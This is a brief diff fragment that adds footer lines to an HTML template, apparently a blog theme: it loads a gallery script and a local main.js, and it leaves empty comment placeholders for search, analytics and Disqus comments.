+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
